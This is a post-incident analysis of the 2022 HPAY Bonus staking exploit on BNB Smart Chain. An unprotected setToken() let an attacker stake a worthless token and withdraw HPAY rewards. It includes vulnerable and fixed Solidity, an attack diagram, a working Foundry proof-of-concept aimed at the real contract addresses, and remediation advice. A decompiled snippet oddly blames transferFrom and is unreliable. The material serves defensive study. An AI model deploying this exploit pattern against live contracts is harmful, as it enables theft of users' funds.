# HPAY — Fake Token Staking to Drain HPAY Rewards Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | HPAY Bonus Staking |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~115 BNB |
| **HPAY Token** | [0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A](https://bscscan.com/address/0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A) |
| **Bonus Contract** | [0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0](https://bscscan.com/address/0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0) |
| **Implementation** | [0xE9bc03Ef08E991a99F1bd095a8590499931DcC30](https://bscscan.com/address/0xE9bc03Ef08E991a99F1bd095a8590499931DcC30) |
| **WBNB/HPAY Pair** | [0xa0A1E7571F938CC33daD497849F14A0c98B30FD0](https://bscscan.com/address/0xa0A1E7571F938CC33daD497849F14A0c98B30FD0) |
| **Attacker** | [0xaB74FBd735Cd2ED826b64e0F850a890930A91094](https://bscscan.com/address/0xaB74FBd735Cd2ED826b64e0F850a890930A91094) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **PancakeRouter** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | `setToken()` lacks access control, allowing arbitrary replacement of the staking token; attacker staked large amounts of a fake token then withdrew HPAY rewards |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/HPAY_exp.sol) |

---
## 1. Vulnerability Overview

The HPAY Bonus contract is designed to distribute HPAY rewards proportional to blocks elapsed when users stake HPAY. While a `setToken()` function existed to change the staking token, it had no access control. The attacker minted a large supply of a worthless SHITCOIN token, replaced the staking token via `setToken(SHITCOIN)`, and staked 100 million SHITCOIN. They then advanced the block number by 1,000 to accumulate rewards, restored the original token via `setToken(HPAY)`, and called `withdraw()` to claim 30 million HPAY as rewards.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Bonus Contract - setToken() has no access control
contract HPAYBonus {
    address public stakingToken; // staking token address

    // ❌ Anyone can change the staking token
    function setToken(address newToken) external {
        stakingToken = newToken;
    }

    function stake(uint256 amount) external {
        IERC20(stakingToken).transferFrom(msg.sender, address(this), amount);
        stakedBalance[msg.sender] += amount;
        lastStakeBlock[msg.sender] = block.number;
    }

    function withdraw() external {
        uint256 elapsed = block.number - lastStakeBlock[msg.sender];
        // ❌ Rewards paid in HPAY regardless of which token was staked
        uint256 reward = stakedBalance[msg.sender] * rewardPerBlock * elapsed;
        IERC20(HPAY).transfer(msg.sender, reward);
        stakedBalance[msg.sender] = 0;
    }
}

// ✅ Correct pattern - staking token is fixed
contract SafeHPAYBonus {
    address public immutable STAKING_TOKEN; // ✅ immutable address

    constructor(address _stakingToken) {
        STAKING_TOKEN = _stakingToken;
    }

    // No setToken() function - token cannot be changed
}
```

---
### On-Chain Source Code

Source: Bytecode decompiled


**HPAY_decompiled.sol** — entry point:
```solidity
// ❌ Root Cause: `setToken()` lacks access control, allowing arbitrary replacement of the staking token; attacker staked large amounts of a fake token then withdrew HPAY rewards
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Mint large supply of SHITCOIN fake token
    │       (100,000,000 SHITCOIN, worthless)
    │
    ├─[2] Call setToken(SHITCOIN)
    │       ❌ No access control → stakingToken = SHITCOIN
    │
    ├─[3] Call stake(100_000_000e18)
    │       Stake 100 million SHITCOIN
    │       └─ stakedBalance[attacker] = 100M (denominated in SHITCOIN)
    │
    ├─[4] vm.roll(block.number + 1000) advance blocks
    │       (in the real attack: wait for blocks to naturally progress or use a separate trigger)
    │       └─ Rewards accumulate: 100M × rewardPerBlock × 1,000
    │
    ├─[5] Call setToken(HPAY) - restore original token
    │       ❌ No access control → stakingToken = HPAY
    │
    ├─[6] Call withdraw()
    │       ❌ Rewards accumulated via SHITCOIN staking are paid out in HPAY
    │       → 30,000,000 HPAY successfully withdrawn
    │
    └─[7] Swap HPAY → WBNB → ~115 BNB net profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IHPAYBonus {
    // ❌ Token setter with no access control
    function setToken(address newToken) external;
    function stake(uint256 amount) external;
    function withdraw() external;
}

interface IHPAY {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

// ⚡ Fake token (worthless)
contract ShitCoin {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract HPAYExploit is Test {
    IHPAYBonus bonus = IHPAYBonus(0xF8bC1434f3C5a7af0BE18c00C675F7B034a002F0);
    IHPAY hpay       = IHPAY(0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A);

    function setUp() public {
        vm.createSelectFork("bsc", 22_280_853);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] HPAY balance", hpay.balanceOf(address(this)), 18);

        // [Step 1] Deploy fake token and mint large supply
        ShitCoin shitcoin = new ShitCoin();
        shitcoin.mint(address(this), 100_000_000 * 1e18);

        // [Step 2] Replace staking token with fake token
        // ⚡ setToken() has no access control
        bonus.setToken(address(shitcoin));

        // [Step 3] Stake large amount of fake tokens
        shitcoin.approve(address(bonus), type(uint256).max);
        bonus.stake(100_000_000 * 1e18);

        // [Step 4] Advance blocks to accumulate rewards
        vm.roll(block.number + 1000);

        // [Step 5] Restore staking token back to HPAY
        bonus.setToken(address(hpay));

        // [Step 6] Withdraw HPAY rewards
        // ⚡ Rewards accumulated via fake token staking are paid out in HPAY
        bonus.withdraw();

        emit log_named_decimal_uint("[End] HPAY balance", hpay.balanceOf(address(this)), 18);

        // [Step 7] Swap HPAY → WBNB (via PancakeRouter)
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Staking token substitution + large-scale fake token staking |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Staking reward manipulation |
| **Attack Vector** | `setToken(fake)` → `stake(fake)` → `setToken(HPAY)` → `withdraw()` |
| **Preconditions** | `setToken()` lacks access control; staking token and reward token are coupled |
| **Impact** | ~115 BNB loss |

---
## 6. Remediation Recommendations

1. **Remove `setToken()` entirely or protect with `onlyOwner`**: Declare the staking token address as `immutable` so it cannot be changed after deployment.
2. **Staking token whitelist**: Explicitly manage which tokens are permitted for staking.
3. **Validate staking value**: Verify the real value (USD value or pool liquidity) of the staked token, and prevent worthless tokens from accruing rewards.

---
## 7. Lessons Learned

- **Scope of configuration functions**: Functions that modify core protocol parameters — such as `setToken()` or `setRewardRate()` — must be protected by multi-tier access control (timelock + multisig). The absence of even a simple `onlyOwner` guard creates an immediate attack path.
- **Decoupling token substitution from reward accrual**: In systems where the staking token and reward token are separate, allowing the staking token to be swapped enables an attack where rewards accumulated via worthless tokens are withdrawn as real tokens.
- **Block number manipulation**: Just as `vm.roll()` is used in test environments, real attackers wait for blocks to naturally progress or use other mechanisms to satisfy reward accrual conditions. Reward calculations should use relative time-based cooldowns rather than absolute block counts.